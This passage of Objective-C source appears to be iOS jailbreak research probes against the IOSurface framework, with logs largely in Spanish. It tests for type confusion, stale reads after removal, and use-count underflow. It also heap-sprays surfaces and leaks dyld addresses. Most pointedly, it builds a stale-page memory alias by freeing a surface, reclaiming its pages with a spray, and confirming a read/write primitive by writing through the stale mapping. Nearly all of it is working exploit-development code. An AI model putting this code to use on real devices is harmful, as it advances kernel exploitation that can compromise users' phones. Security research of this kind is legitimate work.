            } else {
                log(@"TYPECONFUSE: Nested dict readback NULL");
            }
            removeValue(surf, outerKey);
            CFRelease(innerDict);
            CFRelease(innerData);
        }

        log(@"TYPECONFUSE: Step 6 — Stale read after RemoveValue (dangling reference check)");
        if (!isr_stopped()) {
            CFStringRef staleKey = CFSTR("ISRTypeConfuseStale");
            uint64_t staleVal = 0xCAFEBABEDEADBEEFULL;
            CFDataRef staleData = CFDataCreate(kCFAllocatorDefault, (const UInt8 *)&staleVal, 8);
            setValue(surf, staleKey, staleData);
            CFRelease(staleData);

            CFTypeRef beforeRemove = getValue(surf, staleKey);
            if (!beforeRemove) {
                log(@"TYPECONFUSE: pre-remove read NULL — unexpected");
            }
            removeValue(surf, staleKey);
            for (int attempt = 0; attempt < 100 && !isr_stopped(); attempt++) {
                CFTypeRef afterRemove = getValue(surf, staleKey);
                if (afterRemove != NULL) {
                    staleReads++;
                    anomalies++;
                    CFTypeID tid = CFGetTypeID(afterRemove);
                    log([NSString stringWithFormat:@"TYPECONFUSE: ANOMALY — stale read attempt %d returned type %lu after remove!", attempt, (unsigned long)tid]);
                    if (tid == CFDataGetTypeID()) {
                        CFDataRef staleRead = (CFDataRef)afterRemove;
                        CFIndex slen = CFDataGetLength(staleRead);
                        log([NSString stringWithFormat:@"TYPECONFUSE: stale data length: %ld", (long)slen]);
                    }
                    break;
                }
            }
            if (staleReads == 0) {
                log(@"TYPECONFUSE: No stale reads after remove (100 attempts) — clean");
            }
        }

        log(@"TYPECONFUSE: Step 7 — Reserved key type confusion");
        if (!isr_stopped()) {
            CFStringRef reservedKeys[] = {
                CFSTR("IOSurfaceAllocSize"),
                CFSTR("IOSurfaceWidth"),
                CFSTR("IOSurfaceHeight"),
                CFSTR("IOSurfaceBytesPerRow"),
                CFSTR("IOSurfacePixelFormat"),
                CFSTR("IOSurfaceBytesPerElement"),
                CFSTR("IOSurfacePlaneCount")
            };
            int numReserved = 7;
            for (int r = 0; r < numReserved && !isr_stopped(); r++) {
                uint64_t fakeVal2 = 0xfffffff007AABB00ULL | (uint64_t)r;
                CFDataRef asData = CFDataCreate(kCFAllocatorDefault, (const UInt8 *)&fakeVal2, 8);
                setValue(surf, reservedKeys[r], asData);
                CFRelease(asData);

                CFTypeRef reserved_back = getValue(surf, reservedKeys[r]);
                if (reserved_back) {
                    CFTypeID tid = CFGetTypeID(reserved_back);
                    if (tid == CFDataGetTypeID()) {
                        anomalies++;
                        typeMismatches++;
                        log([NSString stringWithFormat:@"TYPECONFUSE: ANOMALY — reserved key %@ stored as CFData! Type confusion on reserved key!", (__bridge NSString *)reservedKeys[r]]);
                    } else if (tid == CFNumberGetTypeID()) {
                        int64_t numBack = 0;
                        CFNumberGetValue((CFNumberRef)reserved_back, kCFNumberSInt64Type, &numBack);
                        if ((uint64_t)numBack == fakeVal2) {
                            log([NSString stringWithFormat:@"TYPECONFUSE: Reserved key %@ accepted raw value 0x%llx — potential overflow!", (__bridge NSString *)reservedKeys[r], (unsigned long long)fakeVal2]);
                            anomalies++;
                        } else {
                            log([NSString stringWithFormat:@"TYPECONFUSE: Reserved key %@ coerced to number 0x%llx", (__bridge NSString *)reservedKeys[r], (unsigned long long)numBack]);
                        }
                    }
                }
            }
        }

        CFRelease(surf);

        gettimeofday(&tv_end, NULL);
        double elapsed = (tv_end.tv_sec - tv_start.tv_sec) + (tv_end.tv_usec - tv_start.tv_usec) / 1e6;
        log([NSString stringWithFormat:@"TYPECONFUSE: Done — %u anomalies (stale:%u typeMismatch:%u corrupt:%u largeAlloc:%u) in %.2fs",
             anomalies, staleReads, typeMismatches, corruptedData, largeAllocAnomalies, elapsed]);

        NSDictionary *res = @{
            @"anomalies": @(anomalies),
            @"staleReads": @(staleReads),
            @"typeMismatches": @(typeMismatches),
            @"corruptedData": @(corruptedData),
            @"largeAllocAnomalies": @(largeAllocAnomalies),
            @"elapsed": @(elapsed)
        };
        isr_checkpoint(@"ISR-TypeConfuse-checkpoint.json", res);
        isr_unload(&sym);
        done(res);
    });
}

#pragma mark - Probe 98: IOConnectCallStructMethod

static void isr_crash_log(const char *msg) {
    NSString *path = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/ISR-crash-log.txt"];
    int fd = open([path UTF8String], O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (fd >= 0) {
        write(fd, msg, strlen(msg));
        write(fd, "\n", 1);
        fsync(fd);
        close(fd);
    }
}

void iosurface_research_struct_method(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        log(@"JB2: ========================================");
        log(@"JB2: IOSurface Framework — Sin IOConnectCall");
        log(@"JB2: ========================================");

        void *h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
        if (!h) {
            log(@"JB2: No se pudo abrir IOSurface.framework");
            done(@{@"error": @"dlopen"});
            return;
        }

        typedef IOSurfaceRef (*CreateFn)(CFDictionaryRef);
        CreateFn createSurf = (CreateFn)dlsym(h, "IOSurfaceCreate");
        typedef uint32_t (*GetIDFn)(IOSurfaceRef);
        GetIDFn getID = (GetIDFn)dlsym(h, "IOSurfaceGetID");
        typedef void* (*GetBaseFn)(IOSurfaceRef);
        GetBaseFn getBase = (GetBaseFn)dlsym(h, "IOSurfaceGetBaseAddress");
        typedef size_t (*GetAllocSzFn)(IOSurfaceRef);
        GetAllocSzFn getAllocSz = (GetAllocSzFn)dlsym(h, "IOSurfaceGetAllocSize");
        typedef size_t (*GetWidthFn)(IOSurfaceRef);
        GetWidthFn getWidth = (GetWidthFn)dlsym(h, "IOSurfaceGetWidth");
        typedef size_t (*GetHeightFn)(IOSurfaceRef);
        GetHeightFn getHeight = (GetHeightFn)dlsym(h, "IOSurfaceGetHeight");
        typedef size_t (*GetBPRFn)(IOSurfaceRef);
        GetBPRFn getBPR = (GetBPRFn)dlsym(h, "IOSurfaceGetBytesPerRow");
        typedef size_t (*GetBPEFn)(IOSurfaceRef);
        GetBPEFn getBPE = (GetBPEFn)dlsym(h, "IOSurfaceGetBytesPerElement");
        typedef OSType (*GetPFFn)(IOSurfaceRef);
        GetPFFn getPF = (GetPFFn)dlsym(h, "IOSurfaceGetPixelFormat");
        typedef size_t (*GetPCFn)(IOSurfaceRef);
        GetPCFn getPC = (GetPCFn)dlsym(h, "IOSurfaceGetPlaneCount");
        typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
        SetValueFn setValue = (SetValueFn)dlsym(h, "IOSurfaceSetValue");
        typedef CFTypeRef (*GetValueFn)(IOSurfaceRef, CFStringRef);
        GetValueFn getValue = (GetValueFn)dlsym(h, "IOSurfaceGetValue");
        typedef CFDictionaryRef (*CopyAllFn)(IOSurfaceRef);
        CopyAllFn copyAll = (CopyAllFn)dlsym(h, "IOSurfaceCopyAllValues");
        typedef void (*RemoveValFn)(IOSurfaceRef, CFStringRef);
        RemoveValFn removeVal = (RemoveValFn)dlsym(h, "IOSurfaceRemoveValue");
        typedef IOSurfaceRef (*LookupFn)(uint32_t);
        LookupFn lookup = (LookupFn)dlsym(h, "IOSurfaceLookup");
        typedef kern_return_t (*LockFn)(IOSurfaceRef, uint32_t, uint32_t *);
        LockFn lockS = (LockFn)dlsym(h, "IOSurfaceLock");
        typedef kern_return_t (*UnlockFn)(IOSurfaceRef, uint32_t, uint32_t *);
        UnlockFn unlockS = (UnlockFn)dlsym(h, "IOSurfaceUnlock");
        typedef void (*IncUseFn)(IOSurfaceRef);
        IncUseFn incUse = (IncUseFn)dlsym(h, "IOSurfaceIncrementUseCount");
        typedef void (*DecUseFn)(IOSurfaceRef);
        DecUseFn decUse = (DecUseFn)dlsym(h, "IOSurfaceDecrementUseCount");
        typedef int32_t (*GetUseFn)(IOSurfaceRef);
        GetUseFn getUse = (GetUseFn)dlsym(h, "IOSurfaceGetUseCount");
        typedef Boolean (*IsInUseFn)(IOSurfaceRef);
        IsInUseFn isInUse = (IsInUseFn)dlsym(h, "IOSurfaceIsInUse");
        typedef uint32_t (*GetSeedFn)(IOSurfaceRef);
        GetSeedFn getSeed = (GetSeedFn)dlsym(h, "IOSurfaceGetSeed");

        log([NSString stringWithFormat:@"JB2: Funciones cargadas: create=%d id=%d base=%d alloc=%d w=%d h=%d bpr=%d bpe=%d pf=%d pc=%d set=%d get=%d copyAll=%d rm=%d lookup=%d lock=%d unlock=%d inc=%d dec=%d use=%d inUse=%d seed=%d",
             createSurf!=NULL, getID!=NULL, getBase!=NULL, getAllocSz!=NULL,
             getWidth!=NULL, getHeight!=NULL, getBPR!=NULL, getBPE!=NULL,
             getPF!=NULL, getPC!=NULL, setValue!=NULL, getValue!=NULL,
             copyAll!=NULL, removeVal!=NULL, lookup!=NULL,
             lockS!=NULL, unlockS!=NULL, incUse!=NULL, decUse!=NULL,
             getUse!=NULL, isInUse!=NULL, getSeed!=NULL]);

        if (!createSurf) {
            log(@"JB2: IOSurfaceCreate no disponible");
            dlclose(h);
            done(@{@"error": @"no_create"});
            return;
        }

        log(@"JB2: --- Paso 1: Crear superficie y examinar propiedades ---");
        NSDictionary *props = @{
            @"IOSurfaceWidth": @64,
            @"IOSurfaceHeight": @64,
            @"IOSurfaceBytesPerElement": @4,
            @"IOSurfacePixelFormat": @(0x42475241),
        };
        IOSurfaceRef surf = createSurf((__bridge CFDictionaryRef)props);
        if (!surf) {
            log(@"JB2: IOSurfaceCreate falló");
            dlclose(h);
            done(@{@"error": @"create_fail"});
            return;
        }

        uint32_t surfID = getID ? getID(surf) : 0;
        log([NSString stringWithFormat:@"JB2: *** Superficie creada ID=%u ***", surfID]);
        if (getBase) log([NSString stringWithFormat:@"JB2: BaseAddress=%p", getBase(surf)]);
        if (getAllocSz) log([NSString stringWithFormat:@"JB2: AllocSize=%zu", getAllocSz(surf)]);
        if (getWidth) log([NSString stringWithFormat:@"JB2: Width=%zu", getWidth(surf)]);
        if (getHeight) log([NSString stringWithFormat:@"JB2: Height=%zu", getHeight(surf)]);
        if (getBPR) log([NSString stringWithFormat:@"JB2: BytesPerRow=%zu", getBPR(surf)]);
        if (getBPE) log([NSString stringWithFormat:@"JB2: BytesPerElement=%zu", getBPE(surf)]);
        if (getPF) log([NSString stringWithFormat:@"JB2: PixelFormat=0x%x", getPF(surf)]);
        if (getPC) log([NSString stringWithFormat:@"JB2: PlaneCount=%zu", getPC(surf)]);
        if (getSeed) log([NSString stringWithFormat:@"JB2: Seed=%u", getSeed(surf)]);

        if (!isr_stopped() && lockS && unlockS) {
            log(@"JB2: --- Paso 2: Lock/Unlock ---");
            uint32_t seed = 0;
            kern_return_t lkr = lockS(surf, 3, &seed);
            log([NSString stringWithFormat:@"JB2: Lock(RW) kr=%d seed=%u", lkr, seed]);

            if (lkr == KERN_SUCCESS && getBase) {
                void *base = getBase(surf);
                if (base) {
                    log([NSString stringWithFormat:@"JB2: Escribiendo patrón en BaseAddress=%p...", base]);
                    memset(base, 0x42, 256);
                    uint8_t *bp = (uint8_t *)base;
                    int ok = 1;
                    for (int i = 0; i < 256; i++) { if (bp[i] != 0x42) { ok = 0; break; } }
                    log([NSString stringWithFormat:@"JB2: Escritura directa: %s", ok ? "OK" : "FALLÓ"]);
                }
            }
            kern_return_t ukr = unlockS(surf, 3, &seed);
            log([NSString stringWithFormat:@"JB2: Unlock kr=%d seed=%u", ukr, seed]);
        }

        if (!isr_stopped() && setValue && getValue) {
            log(@"JB2: --- Paso 3: SetValue/GetValue (kernel properties) ---");

            uint8_t pat[4096];
            for (int i = 0; i < 4096; i++) pat[i] = (uint8_t)(i & 0xFF);
            NSData *data4k = [NSData dataWithBytes:pat length:4096];
            setValue(surf, CFSTR("test_4k"), (__bridge CFTypeRef)data4k);

            CFTypeRef rb = getValue(surf, CFSTR("test_4k"));
            if (rb && CFGetTypeID(rb) == CFDataGetTypeID()) {
                CFIndex len = CFDataGetLength((CFDataRef)rb);
                log([NSString stringWithFormat:@"JB2: SetValue/GetValue 4K: OK len=%ld", (long)len]);
            } else {
                log(@"JB2: SetValue/GetValue 4K: FALLÓ o tipo incorrecto");
            }

            int sizes[] = {256, 1024, 4096, 16384, 65536, 262144};
            for (int si = 0; si < 6; si++) {
                if (isr_stopped()) break;
                int sz = sizes[si];
                uint8_t *buf = (uint8_t *)calloc(1, (size_t)sz);
                if (!buf) continue;
                memset(buf, 0xAA, (size_t)sz);
                NSData *d = [NSData dataWithBytes:buf length:(NSUInteger)sz];
                NSString *key = [NSString stringWithFormat:@"size_%d", sz];
                setValue(surf, (__bridge CFStringRef)key, (__bridge CFTypeRef)d);

                CFTypeRef r = getValue(surf, (__bridge CFStringRef)key);
                if (r && CFGetTypeID(r) == CFDataGetTypeID()) {
                    CFIndex rl = CFDataGetLength((CFDataRef)r);
                    log([NSString stringWithFormat:@"JB2: size=%d: OK readback=%ld", sz, (long)rl]);
                } else {
                    log([NSString stringWithFormat:@"JB2: size=%d: FALLÓ", sz]);
                }
                free(buf);
            }

            setValue(surf, CFSTR("num_test"), (__bridge CFTypeRef)@(0xDEADBEEF));
            CFTypeRef numRb = getValue(surf, CFSTR("num_test"));
            if (numRb && CFGetTypeID(numRb) == CFNumberGetTypeID()) {
                uint64_t v = 0;
                CFNumberGetValue((CFNumberRef)numRb, kCFNumberSInt64Type, &v);
                log([NSString stringWithFormat:@"JB2: Number: 0x%llx (esperado 0xDEADBEEF)", v]);
            }

            setValue(surf, CFSTR("str_test"), CFSTR("HELLO_FROM_USERLAND"));
            CFTypeRef strRb = getValue(surf, CFSTR("str_test"));
            if (strRb && CFGetTypeID(strRb) == CFStringGetTypeID()) {
                log([NSString stringWithFormat:@"JB2: String: %@", (__bridge NSString *)strRb]);
            }
        }

        if (!isr_stopped() && copyAll) {
            log(@"JB2: --- Paso 4: CopyAllValues ---");
            CFDictionaryRef allVals = copyAll(surf);
            if (allVals) {
                CFIndex cnt = CFDictionaryGetCount(allVals);
                log([NSString stringWithFormat:@"JB2: Total keys: %ld", (long)cnt]);

                if (cnt > 0 && cnt < 200) {
                    const void **keys = (const void **)malloc(sizeof(void*) * (size_t)cnt);
                    const void **vals = (const void **)malloc(sizeof(void*) * (size_t)cnt);
                    if (keys && vals) {
                        CFDictionaryGetKeysAndValues(allVals, keys, vals);
                        for (CFIndex i = 0; i < cnt && i < 20; i++) {
                            NSString *k = (__bridge NSString *)keys[i];
                            CFTypeID tid = CFGetTypeID(vals[i]);
                            NSString *tn = @"?";
                            if (tid == CFDataGetTypeID()) tn = [NSString stringWithFormat:@"Data(%ld)", (long)CFDataGetLength((CFDataRef)vals[i])];
                            else if (tid == CFStringGetTypeID()) tn = [NSString stringWithFormat:@"Str(%@)", (__bridge NSString*)vals[i]];
                            else if (tid == CFNumberGetTypeID()) {
                                int64_t nv = 0;
                                CFNumberGetValue((CFNumberRef)vals[i], kCFNumberSInt64Type, &nv);
                                tn = [NSString stringWithFormat:@"Num(%lld/0x%llx)", nv, (uint64_t)nv];
                            }
                            else if (tid == CFDictionaryGetTypeID()) tn = [NSString stringWithFormat:@"Dict(%ld)", (long)CFDictionaryGetCount((CFDictionaryRef)vals[i])];
                            else if (tid == CFArrayGetTypeID()) tn = [NSString stringWithFormat:@"Array(%ld)", (long)CFArrayGetCount((CFArrayRef)vals[i])];
                            else if (tid == CFBooleanGetTypeID()) tn = [NSString stringWithFormat:@"Bool(%d)", CFBooleanGetValue((CFBooleanRef)vals[i])];
                            log([NSString stringWithFormat:@"JB2: [%ld] %@ = %@", (long)i, k, tn]);
                        }
                    }
                    if (keys) free(keys);
                    if (vals) free(vals);
                }
                CFRelease(allVals);
            }
        }

        if (!isr_stopped() && incUse && decUse && getUse) {
            log(@"JB2: --- Paso 5: UseCount ---");
            int32_t uc0 = getUse(surf);
            incUse(surf); int32_t uc1 = getUse(surf);
            incUse(surf); int32_t uc2 = getUse(surf);
            log([NSString stringWithFormat:@"JB2: UseCount: %d -> %d -> %d", uc0, uc1, uc2]);
            decUse(surf); decUse(surf);

            log(@"JB2: Probando underflow de UseCount...");
            int32_t ucBefore = getUse(surf);
            decUse(surf);
            int32_t ucAfter = getUse(surf);
            log([NSString stringWithFormat:@"JB2: UseCount underflow: %d -> %d", ucBefore, ucAfter]);
            if (ucAfter < 0) log(@"JB2: *** USECOUNT NEGATIVO — posible primitiva ***");
            incUse(surf);
        }

        if (!isr_stopped() && lookup && surfID > 0) {
            log(@"JB2: --- Paso 6: Lookup cross-process ---");
            IOSurfaceRef looked = lookup(surfID);
            if (looked) {
                log([NSString stringWithFormat:@"JB2: Lookup(%u) OK", surfID]);
                if (getBase) {
                    void *b1 = getBase(surf);
                    void *b2 = getBase(looked);
                    log([NSString stringWithFormat:@"JB2: Original base=%p Lookup base=%p same=%s",
                         b1, b2, (b1 == b2) ? "SI" : "NO"]);
                }
                CFRelease(looked);
            }
        }

        if (!isr_stopped()) {
            log(@"JB2: --- Paso 7: Heap spray 100 superficies ---");
            IOSurfaceRef surfs[100];
            int created = 0;
            for (int i = 0; i < 100; i++) {
                NSDictionary *p = @{
                    @"IOSurfaceWidth": @16,
                    @"IOSurfaceHeight": @16,
                    @"IOSurfaceBytesPerElement": @4,
                    @"IOSurfacePixelFormat": @(0x42475241),
                };
                surfs[i] = createSurf((__bridge CFDictionaryRef)p);
                if (surfs[i]) created++;
                else break;
            }
            log([NSString stringWithFormat:@"JB2: Creadas: %d/100", created]);

            if (created >= 3 && getID && getBase) {
                uint32_t id0 = getID(surfs[0]);
                uint32_t id1 = getID(surfs[1]);
                uint32_t idL = getID(surfs[created-1]);
                void *b0 = getBase(surfs[0]);
                void *b1 = getBase(surfs[1]);
                void *bL = getBase(surfs[created-1]);
                log([NSString stringWithFormat:@"JB2: ID[0]=%u ID[1]=%u ID[last]=%u seq=%s",
                     id0, id1, idL, (id1==id0+1)?"SI":"NO"]);
                log([NSString stringWithFormat:@"JB2: Base[0]=%p Base[1]=%p diff=%td",
                     b0, b1, (uint8_t*)b1-(uint8_t*)b0]);
                log([NSString stringWithFormat:@"JB2: Base[last]=%p total_span=%td",
                     bL, (uint8_t*)bL-(uint8_t*)b0]);
            }

            for (int i = 0; i < created; i++) {
                if (surfs[i]) CFRelease(surfs[i]);
            }
        }

        if (!isr_stopped()) {
            log(@"JB2: --- Paso 8: Task info ---");
            task_dyld_info_data_t di;
            mach_msg_type_number_t dc = TASK_DYLD_INFO_COUNT;
            if (task_info(mach_task_self(), TASK_DYLD_INFO, (task_info_t)&di, &dc) == KERN_SUCCESS) {
                log([NSString stringWithFormat:@"JB2: DYLD addr=0x%llx size=%llu", di.all_image_info_addr, di.all_image_info_size]);
            }
            struct task_vm_info vi;
            mach_msg_type_number_t vc = TASK_VM_INFO_COUNT;
            if (task_info(mach_task_self(), TASK_VM_INFO, (task_info_t)&vi, &vc) == KERN_SUCCESS) {
                log([NSString stringWithFormat:@"JB2: VM vsize=%llu rsize=%llu pgsz=%d", vi.virtual_size, vi.resident_size, vi.page_size]);
            }
        }

        CFRelease(surf);
        log(@"JB2: ========================================");
        log(@"JB2: Completado. Sin IOConnectCall = sin crash.");
        log(@"JB2: ========================================");

        dlclose(h);
        done(@{@"phase2": @"complete"});
    });
}

#pragma mark - Probe JB10: Normal Surface Stale Alias (no PurpleGfxMem)

void iosurface_stale_page_alias(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        log(@"JB3: ========================================");
        log(@"JB3: Stale-Page Physical Alias Probe");
        log(@"JB3: ========================================");

        void *h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
        if (!h) { log(@"JB3: No se pudo abrir IOSurface.framework"); done(@{@"error": @"dlopen"}); return; }

        typedef IOSurfaceRef (*CreateFn)(CFDictionaryRef);
        CreateFn createSurf = (CreateFn)dlsym(h, "IOSurfaceCreate");
        typedef uint32_t (*GetIDFn)(IOSurfaceRef);
        GetIDFn getID = (GetIDFn)dlsym(h, "IOSurfaceGetID");
        typedef void* (*GetBaseFn)(IOSurfaceRef);
        GetBaseFn getBase = (GetBaseFn)dlsym(h, "IOSurfaceGetBaseAddress");
        typedef size_t (*GetAllocSzFn)(IOSurfaceRef);
        GetAllocSzFn getAllocSz = (GetAllocSzFn)dlsym(h, "IOSurfaceGetAllocSize");
        typedef kern_return_t (*LockFn)(IOSurfaceRef, uint32_t, uint32_t *);
        LockFn lockS = (LockFn)dlsym(h, "IOSurfaceLock");
        typedef kern_return_t (*UnlockFn)(IOSurfaceRef, uint32_t, uint32_t *);
        UnlockFn unlockS = (UnlockFn)dlsym(h, "IOSurfaceUnlock");

        typedef kern_return_t (*MakeEntryFn)(vm_map_t, memory_object_size_t *,
            memory_object_offset_t, vm_prot_t, mach_port_t *,
            mem_entry_name_port_t);
        MakeEntryFn makeEntry = (MakeEntryFn)dlsym(RTLD_DEFAULT, "mach_make_memory_entry_64");

        if (!createSurf || !getBase || !makeEntry) {
            log([NSString stringWithFormat:@"JB3: Funciones: create=%d base=%d makeEntry=%d",
                 createSurf!=NULL, getBase!=NULL, makeEntry!=NULL]);
            dlclose(h);
            done(@{@"error": @"dlsym"});
            return;
        }
        log(@"JB3: Todas las funciones cargadas OK");

        log(@"JB3: --- Paso 1: Crear superficie PurpleGfxMem ---");
        NSDictionary *props = @{
            @"IOSurfaceWidth": @64,
            @"IOSurfaceHeight": @64,
            @"IOSurfaceBytesPerElement": @4,
            @"IOSurfacePixelFormat": @(0x42475241),
            @"IOSurfaceMemoryRegion": @"PurpleGfxMem",
        };
        IOSurfaceRef surf = createSurf((__bridge CFDictionaryRef)props);
        if (!surf) {
            log(@"JB3: Creación PurpleGfxMem falló, probando sin region...");
            NSDictionary *fallback = @{
                @"IOSurfaceWidth": @64,
                @"IOSurfaceHeight": @64,
                @"IOSurfaceBytesPerElement": @4,
                @"IOSurfacePixelFormat": @(0x42475241),
            };
            surf = createSurf((__bridge CFDictionaryRef)fallback);
            if (!surf) {
                log(@"JB3: IOSurfaceCreate falló completamente");
                dlclose(h);
                done(@{@"error": @"create_fail"});
                return;
            }
            log(@"JB3: Superficie creada sin PurpleGfxMem (fallback)");
        } else {
            log(@"JB3: *** Superficie PurpleGfxMem creada! ***");
        }

        uint32_t surfID = getID ? getID(surf) : 0;
        size_t allocSz = getAllocSz ? getAllocSz(surf) : 0;
        void *base = NULL;

        if (lockS) {
            uint32_t seed = 0;
            lockS(surf, 3, &seed);
        }
        base = getBase(surf);
        log([NSString stringWithFormat:@"JB3: ID=%u AllocSize=%zu Base=%p", surfID, allocSz, base]);

        if (!base || allocSz == 0) {
            log(@"JB3: BaseAddress NULL o AllocSize 0 — no se puede continuar");
            if (unlockS) { uint32_t s = 0; unlockS(surf, 3, &s); }
            CFRelease(surf);
            dlclose(h);
            done(@{@"error": @"no_base"});
            return;
        }

        log(@"JB3: --- Paso 2: Escribir marcador en la superficie ---");
        uint32_t marker = 0xDEAD1337;
        memset(base, 0, allocSz < 4096 ? allocSz : 4096);
        memcpy(base, &marker, sizeof(marker));
        uint32_t readBack = 0;
        memcpy(&readBack, base, sizeof(readBack));
        log([NSString stringWithFormat:@"JB3: Marcador escrito: 0x%08X leído: 0x%08X", marker, readBack]);

        if (unlockS) { uint32_t s = 0; unlockS(surf, 3, &s); }

        log(@"JB3: --- Paso 3: mach_make_memory_entry_64 ---");
        mach_port_t entryPort = MACH_PORT_NULL;
        memory_object_size_t entrySize = (memory_object_size_t)allocSz;
        kern_return_t mkr = makeEntry(mach_task_self(), &entrySize,
            (memory_object_offset_t)(uintptr_t)base,
            VM_PROT_READ | VM_PROT_WRITE, &entryPort, MACH_PORT_NULL);

        log([NSString stringWithFormat:@"JB3: mach_make_memory_entry_64 kr=%d port=%u size=%llu",
             mkr, entryPort, (uint64_t)entrySize]);

        if (mkr != KERN_SUCCESS || entryPort == MACH_PORT_NULL) {
            log(@"JB3: memory entry falló — probando con solo READ...");
            entrySize = (memory_object_size_t)allocSz;
            mkr = makeEntry(mach_task_self(), &entrySize,
                (memory_object_offset_t)(uintptr_t)base,
                VM_PROT_READ, &entryPort, MACH_PORT_NULL);
            log([NSString stringWithFormat:@"JB3: Retry READ-only kr=%d port=%u", mkr, entryPort]);
        }

        if (mkr != KERN_SUCCESS || entryPort == MACH_PORT_NULL) {
            log(@"JB3: No se pudo crear memory entry");
            CFRelease(surf);
            dlclose(h);
            done(@{@"error": @"memory_entry_fail"});
            return;
        }

        log(@"JB3: --- Paso 4: vm_map del memory entry (alias) ---");
        vm_address_t alias = 0;
        kern_return_t vmkr = vm_map(mach_task_self(), &alias, (vm_size_t)entrySize,
            0, VM_FLAGS_ANYWHERE, entryPort, 0, FALSE,
            VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
            VM_INHERIT_NONE);

        log([NSString stringWithFormat:@"JB3: vm_map kr=%d alias=%p", vmkr, (void*)alias]);

        if (vmkr != KERN_SUCCESS) {
            log(@"JB3: vm_map falló");
            mach_port_deallocate(mach_task_self(), entryPort);
            CFRelease(surf);
            dlclose(h);
            done(@{@"error": @"vm_map_fail"});
            return;
        }

        uint32_t aliasRead = 0;
        memcpy(&aliasRead, (void*)alias, sizeof(aliasRead));
        log([NSString stringWithFormat:@"JB3: *** Alias lee marcador: 0x%08X (esperado 0xDEAD1337) match=%s ***",
             aliasRead, (aliasRead == marker) ? "SI" : "NO"]);

        log(@"JB3: --- Paso 5: Escribir por alias, leer por base ---");
        uint32_t aliasMarker = 0xCAFEBABE;
        memcpy((void*)alias, &aliasMarker, sizeof(aliasMarker));
        if (lockS) { uint32_t s = 0; lockS(surf, 3, &s); }
        uint32_t baseRead2 = 0;
        memcpy(&baseRead2, getBase(surf), sizeof(baseRead2));
        if (unlockS) { uint32_t s = 0; unlockS(surf, 3, &s); }
        log([NSString stringWithFormat:@"JB3: Alias escribió 0xCAFEBABE, base lee: 0x%08X match=%s",
             baseRead2, (baseRead2 == aliasMarker) ? "SI" : "NO"]);
        int bidirectional = (aliasRead == marker && baseRead2 == aliasMarker);
        log([NSString stringWithFormat:@"JB3: *** ALIAS BIDIRECCIONAL: %s ***",
             bidirectional ? "CONFIRMADO" : "FALLIDO"]);

        log(@"JB3: --- Paso 6: CFRelease superficie, alias persiste? ---");
        CFRelease(surf);
        surf = NULL;

        uint32_t staleRead1 = 0;
        memcpy(&staleRead1, (void*)alias, sizeof(staleRead1));
        log([NSString stringWithFormat:@"JB3: Post-release alias lee: 0x%08X (stale=%s)",
             staleRead1, (staleRead1 == aliasMarker) ? "SI-STALE" : "CAMBIÓ"]);

        if (!isr_stopped()) {
            log(@"JB3: --- Paso 7: Spray 50 superficies para reclamar páginas ---");
            IOSurfaceRef sprays[50];
            int sprayed = 0;
            uint32_t sprayMarker = 0xBBBBBBBB;
            for (int i = 0; i < 50 && !isr_stopped(); i++) {
                NSDictionary *sp = @{
                    @"IOSurfaceWidth": @64,
                    @"IOSurfaceHeight": @64,
                    @"IOSurfaceBytesPerElement": @4,
                    @"IOSurfacePixelFormat": @(0x42475241),
                };
                sprays[i] = createSurf((__bridge CFDictionaryRef)sp);
                if (sprays[i]) {
                    if (lockS) { uint32_t s = 0; lockS(sprays[i], 3, &s); }
                    void *sb = getBase(sprays[i]);
                    if (sb) memcpy(sb, &sprayMarker, sizeof(sprayMarker));
                    if (unlockS) { uint32_t s = 0; unlockS(sprays[i], 3, &s); }
                    sprayed++;
                }
            }
            log([NSString stringWithFormat:@"JB3: Spray: %d/50 superficies creadas", sprayed]);

            uint32_t staleRead2 = 0;
            memcpy(&staleRead2, (void*)alias, sizeof(staleRead2));
            log([NSString stringWithFormat:@"JB3: Post-spray alias lee: 0x%08X", staleRead2]);

            if (staleRead2 == sprayMarker) {
                log(@"JB3: *** RECLAMACIÓN EXITOSA — ALIAS VE DATOS DEL SPRAY ***");
                log(@"JB3: *** PRIMITIVA DE LECTURA/ESCRITURA STALE-PAGE CONFIRMADA ***");

                uint32_t writeViaStale = 0x41414141;
                memcpy((void*)alias, &writeViaStale, sizeof(writeViaStale));
                log(@"JB3: Escrito 0x41414141 vía alias stale");

                for (int i = 0; i < sprayed; i++) {
                    if (!sprays[i]) continue;
                    if (lockS) { uint32_t s = 0; lockS(sprays[i], 3, &s); }
                    void *sb = getBase(sprays[i]);
                    if (sb) {
                        uint32_t v = 0;
                        memcpy(&v, sb, sizeof(v));
                        if (v == writeViaStale) {
                            uint32_t sid = getID ? getID(sprays[i]) : 0;
                            log([NSString stringWithFormat:
                                @"JB3: *** ESCRITURA STALE CONFIRMADA en superficie %d (ID=%u) ***", i, sid]);
                        }
                    }
                    if (unlockS) { uint32_t s = 0; unlockS(sprays[i], 3, &s); }
                }
            } else if (staleRead2 == aliasMarker) {
                log(@"JB3: Alias aún tiene datos viejos — páginas no reclamadas por spray");
                log(@"JB3: Las páginas PurpleGfxMem solo se reciclan entre IOSurfaces");
            } else {
                log([NSString stringWithFormat:@"JB3: Contenido cambió a 0x%08X — reciclado por otro subsistema", staleRead2]);
            }

            for (int i = 0; i < sprayed; i++) {
                if (sprays[i]) CFRelease(sprays[i]);
            }
        }

        log(@"JB3: --- Paso 8: Spray PurpleGfxMem para reclamar ---");
        if (!isr_stopped()) {
            uint32_t pgmMarker = 0xAAAAAAAA;
            IOSurfaceRef pgmSprays[30];
            int pgmCount = 0;
            for (int i = 0; i < 30 && !isr_stopped(); i++) {
                NSDictionary *pp = @{
                    @"IOSurfaceWidth": @64,
                    @"IOSurfaceHeight": @64,
                    @"IOSurfaceBytesPerElement": @4,
